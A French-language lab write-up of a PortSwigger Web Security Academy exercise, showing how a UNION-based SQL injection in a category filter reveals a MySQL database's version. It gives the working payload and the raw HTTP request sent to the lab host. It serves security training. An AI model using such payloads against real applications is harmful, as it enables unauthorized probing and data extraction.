# 💉 Lab : SQL injection attack, querying the database type and version on MySQL and Microsoft
**Catégorie :** Injection SQL (SQLi)
**Type :** UNION-Based SQLi (Database Enumeration)
**Plateforme :** PortSwigger Web Security Academy

---

## 📌 Résumé de la Vulnérabilité
La fonctionnalité de filtre des catégories est vulnérable à une injection SQL. En utilisant une attaque UNION, il est possible d'interroger la base de données pour extraire son type et sa version. Cette étape (l'énumération) est cruciale lors d'un pentest pour adapter les charges utiles (payloads) spécifiques au moteur SQL utilisé en backend.

## 🛠️ Preuve de Concept (PoC)
1. **Identification de la structure et du moteur SQL :**
   - Le test des commentaires a révélé une spécificité MySQL : le commentaire classique `--` retournait une erreur 500, tandis que `-- -` (avec un espace obligatoire après les tirets) a retourné un code 200 OK.
   - La requête utilise 2 colonnes, qui acceptent toutes les deux le type texte.

2. **Extraction de la version :**
   L'injection de la variable système `@@version` (spécifique à MySQL et Microsoft SQL Server) dans la première colonne a permis de récupérer les informations du serveur.

   - **Payload :** `category=Gifts' UNION SELECT @@version,NULL-- -`

3. **Résultat :**
   La version exacte de la base de données s'est affichée dans la liste des produits :
   - `8.0.42-0ubuntu0.20.04.1` (Confirmant qu'il s'agit d'un serveur MySQL tournant sous Ubuntu).

```http
GET /filter?category=Gifts'+UNION+SELECT+@@version,NULL--+- HTTP/2
Host: 0a5f000c0348c1f780dc308a007a0074.web-security-academy.net